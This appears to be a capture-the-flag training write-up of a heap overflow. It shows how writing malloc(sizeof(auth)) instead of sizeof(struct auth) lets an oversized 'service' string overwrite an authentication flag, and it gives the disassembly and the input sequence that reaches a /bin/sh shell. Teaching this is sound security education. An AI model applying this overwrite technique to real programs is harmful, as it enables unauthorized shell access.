So the first thing we notice is a struct. We will come back to this later

```C
struct auth { //note the lack of typedef
  char name[32];
  int auth;
};

struct auth *auth; // naming the struct pointer the same as the struct its self
char *service;
```




Let's look at the auth function
```C    
if(strncmp(line, "auth ", 5) == 0)
{
    auth = malloc(sizeof(auth)); // should be sizeof(struct auth)
    memset(auth, 0, sizeof(auth));

    if(strlen(line + 5) < 31)
        strcpy(auth->name, line + 5);
}
```

and the corresponding assembly

```C
auth = malloc(sizeof(auth)); // should be sizeof(struct auth)
```

```asm
804866e:	83 ec 0c             	sub    esp,0xc
8048671:	6a 04                	push   0x4 ; only 0x4 bytes!!
8048673:	e8 08 fe ff ff       	call   8048480 <malloc@plt>
8048678:	83 c4 10             	add    esp,0x10
804867b:	a3 e8 9a 04 08       	mov    ds:0x8049ae8,eax
```
This is the main bug in this program. Because the dev wrote `sizeof(auth)` and not `sizeof(struct auth)`, there will be `0x4` bytes of memory (the size of `*auth`) allocated and not `0x24` (the size of `struct auth`).




Lets see what happens with the service case.
```C
if(strncmp(line, "service", 6) == 0)
    service = strdup(line + 7); //this will stored on the heap
```
Notice that we do not have any restrictions on the amount of memory allocated.


Let's take a look at the login command

```c    
if(strncmp(line, "login", 5) == 0)
{
  if(auth->auth)
  {
      printf("Welcome Adnim!\n");
      system("/bin/sh");
  } else
      printf("please enter your password\n");
}
```  

the most important line

```c
if(auth->auth)
```

```asm
8048751:	a1 e8 9a 04 08       	mov    eax,ds:0x8049ae8
8048756:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20] ;0x20 offset
8048759:	85 c0                	test   eax,eax
804875b:	74 25                	je     8048782 <main+0x187>
```


![A basic visualization](https://github.com/kablaa/CTF-Workshop/blob/master/writeups/heap2/heap.png)

So what is happening is this: Because only 0x4 bytes are being allocated on the heap, and because `auth->auth` is at `<location of auth> + 0x20`, `service` is now located _before_ `auth->auth`. So we can overwrite the value.

so we can run
```sh
auth lessthan32bits
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
login
```

This is why we should be careful with how we name our variables kids!
